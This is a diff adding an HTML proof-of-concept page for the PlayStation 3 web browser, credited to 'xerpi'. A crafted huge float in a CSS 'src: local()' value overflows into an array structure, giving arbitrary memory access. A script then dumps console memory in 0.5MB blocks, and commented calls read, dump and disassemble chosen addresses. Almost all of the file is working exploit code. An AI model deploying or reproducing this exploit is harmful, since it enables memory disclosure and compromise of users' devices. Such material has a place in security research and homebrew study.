@@ -1,0 +1,107 @@
+<html>
+
+<h1 id=1 style="src: local(
+
+-0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000041445225351634016492053742118359118817711472156291430191338190353249440650
+
+);" />
+
+
+<body>
+<h2>PS3 PoC</h2><h3>by xerpi</h3></br>
+<script src="include/jquery.js"></script>
+<script src="include/utils.js"></script>
+<script type="text/javascript">
+
+/* this ^ large float number overflows into an array
+that is like:
+	struct array {
+		void *base;
+		int size;
+	};
+In order to set a custom base and size, use the h2f tool.
+It'll "convert" the base and size and give you the float number.
+*/
+
+// global vars
+var BASE_ADDR = 0x80000000;
+var ele = document.getElementById('1');
+var mem = ele.style.src;
+mem = mem.substr(6); //local(
+var memsize = mem.length*2;
+var STEP = 0x00050000; // 0.5MB
+var i = 0;
+
+
+function main()
+{
+	//find_str_step("ELF");
+
+	if (i < 0x01000000) {
+		send_dump_real_addr(i, STEP);
+		i += STEP;
+	} else {
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+		logAdd("======== END OF DUMP ========");
+	}
+
+	/*var msg = "";
+	var start = "";
+	var end = "";
+	for (j = 0; j < 0x04000000; j+= 0x80000) {
+		start = j.toString(16).toUpperCase();
+		end = (j+0x80000).toString(16).toUpperCase();
+		msg = msg + " 0x" + start + "-0x" + end + ".bin";
+	}
+	dbg(msg);*/
+
+	//send_read(0x1985e4, 0x100);
+
+	/*var block = 0x3500;
+	for (var i = 0; i < len; i+= block) {
+		dump_bytes(i, block)
+	}*/
+	//send_dump(10, 0x100);
+	//send_dump(0, 0x100);
+
+	//send_read(0x6ab180, 0x1000);
+	//send_dump(0x50b78c, 0xA0000);
+	//send_disasm(0x50b78d+0x120, 500);
+	//logAdd(s.charCodeAt(n));
+}
+
+function btnClick()
+{
+	try {
+		logAdd("======== Start ========");
+		main();
+		logAdd("======== End ========");
+	} catch(e) {
+		dbg(e);
+	}
+}
+
+
+// print environment info
+writeEnvInfo();
+/*
+document.write(
+"<h1 id=2 style=\"src: local(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000149166814797656930317536036916555936412317292798868691882309311268890342299594479676190658843261809903653034673295432095120696840889311854451790224796789957659858969637731992149641303614889028974326961354630);\" />"
+);*/
+
+document.write("BASEADDR: 0x" + BASE_ADDR.toString(16).toUpperCase() + "<br/>");
+document.write("MEM SIZE: 0x" + memsize.toString(16).toUpperCase() +
+			   " bytes (" + (memsize/1024)/1024 + " MB)<br/><br/>");
+
+</script>
+<button style="width:100px;" onclick="btnClick();">Start</button>
+<br/><br/>
+<div id="log"></div><br>
+</body>
+</html>
